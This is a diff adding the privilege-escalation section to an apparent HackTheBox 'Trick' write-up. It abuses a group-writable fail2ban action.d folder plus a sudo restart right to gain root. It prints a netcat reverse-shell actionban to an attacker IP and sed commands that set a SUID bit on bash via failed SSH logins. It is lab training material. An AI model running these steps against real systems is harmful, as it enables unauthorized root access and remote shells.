@@ -1,5 +1,6 @@
 ## Trick 🔮
 `IP address: 10.10.11.166`
+`OS: Linux`
 
 Enumeration is the key when you come to this box. It has also a lot of rabbit holes, which could be very "tricky" and you easily get lost.
 
@@ -221,3 +222,139 @@ Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Lin
 michael@trick:~$ hostname
 trick
 ```
+
+### Rooting
+
+Started the privilege escalation with [Linux Privesc Checker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py), however it did not really bring light to the situation. I saw a lot of `fail2ban` logs, so I started to investigate the `fail2ban` service and google was set on fire by my search queries. 
+
+By listing the fail2ban config folder the following result returned:
+
+```
+michael@trick:~$ ls -l /etc/fail2ban/
+total 60
+drwxrwx--- 2 root security  4096 Jul  7 20:54 action.d
+-rw-r--r-- 1 root root      2334 Jul  7 20:54 fail2ban.conf
+drwxr-xr-x 2 root root      4096 Jul  7 20:54 fail2ban.d
+drwxr-xr-x 3 root root      4096 Jul  7 20:54 filter.d
+-rw-r--r-- 1 root root     22908 Jul  7 20:54 jail.conf
+drwxr-xr-x 2 root root      4096 Jul  7 20:54 jail.d
+-rw-r--r-- 1 root root       645 Jul  7 20:54 paths-arch.conf
+-rw-r--r-- 1 root root      2827 Jul  7 20:54 paths-common.conf
+-rw-r--r-- 1 root root       573 Jul  7 20:54 paths-debian.conf
+-rw-r--r-- 1 root root       738 Jul  7 20:54 paths-opensuse.conf
+```
+
+You may notice the `action.d` folder has different group owner as the other files and dictioneries. It has a `security` group owner and michael belongs to this group. At this point it was pretty straightforward, and there are a few privesc tutorials on the internet, which described the whole rooting process. 
+
+Just a few word about the `fail2ban` service:
+
+*Fail2ban is an intrusion prevention software framework that protects computer servers from brute-force attacks. Fail2ban scans log files (e.g. /var/log/httpd/error_log) and bans IPs that show the malicious signs like too many password failures, seeking for exploits, etc.*
+
+
+**jail.conf** - config file. This config file describes the default banaction and individual banaction for every service.
+**bantime** - cooldown time of the ban
+**findtime** - Within this timeframe IPs are banned, which passed the *maxretry* threshold
+**maxretry** - Maxiumum login tries in the 'findtime' period
+**banaction** - The default action when a ban action was triggered
+**actoion.d** - A folder which contains the banaction config files
+
+It also turned out from the config files the SSH service was enabled in fail2ban.
+
+Example:
+- bantime: 10s
+- findtime: 10s
+- maxretry: 5
+- banaction: iptables-multiport
+
+To trigger the banaction you need to do 5 failed SSH login probe in 10 seconds. After that banaction tiggers and run the `iptables-multiport.conf` file, which defines the desired commands to run.
+
+The default iptables-multiport.conf file:
+
+```
+# Fail2Ban configuration file
+#
+# Author: Cyril Jaquier
+# Modified by Yaroslav Halchenko for multiport banning
+#
+
+[INCLUDES]
+
+before = iptables-common.conf
+
+[Definition]
+
+# Option:  actionstart
+# Notes.:  command executed once at the start of Fail2Ban.
+# Values:  CMD
+#
+actionstart = <iptables> -N f2b-<name>
+              <iptables> -A f2b-<name> -j <returntype>
+              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
+
+# Option:  actionstop
+# Notes.:  command executed once at the end of Fail2Ban
+# Values:  CMD
+#
+actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
+             <actionflush>
+             <iptables> -X f2b-<name>
+
+# Option:  actioncheck
+# Notes.:  command executed once before each actionban command
+# Values:  CMD
+#
+actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
+
+# Option:  actionban
+# Notes.:  command executed when banning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionban = /usr/bin/nc 10.10.14.42 443 -e /usr/bin/bash
+
+# Option:  actionunban
+# Notes.:  command executed when unbanning an IP. Take care that the
+#          command is executed with Fail2Ban user rights.
+# Tags:    See jail.conf(5) man page
+# Values:  CMD
+#
+actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
+
+[Init]
+```
+
+Using the following command we can change the uniqe *actionban* of the above-mentioned action:
+
+```
+CMD='chmod +s /bin/bash'
+
+sed -i -E "s\actionban =.*\actionban = $CMD\g" /etc/fail2ban/action.d/iptables-multiport.conf
+sed -i -E "s\actionunban =.*\actionunban = $CMD\g" /etc/fail2ban/action.d/iptables-multiport.conf
+cat /etc/fail2ban/action.d/iptables-multiport.conf
+```
+
+Now after 5 failed SSH login attempts, the actionban command will be executed and the bash binary gets a SUID bit.
+
+Running the `/bin/bash` binary with the `-p` swtich and the SUID bit on it will result `root` access to the system.
+
+To apply the modifications, we need to reload the service. At the beginning I tried to restart the fail2ban with the `systemctl` command. Michael had sudo, but I did not know which commands he had right to execute, because the sudoers file was restricted. So I started harvesting password from the DB connection string and from the database. None of them worked. And after some time I realised the `sudo -l` lists the allowed commands for the invoked user:
+
+```
+michael@trick:/etc/init.d$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+```
+
+And here we go. Michael did not have right to execute the `systemctl` but he did have right to run `/etc/init.d/fail2ban restart`.
+
+So after the service restart, 5 failed SSH login attempts were made and the `bash` binary got the SUID bit:
+
+```
+bash-5.0# whoami
+root
+```
+
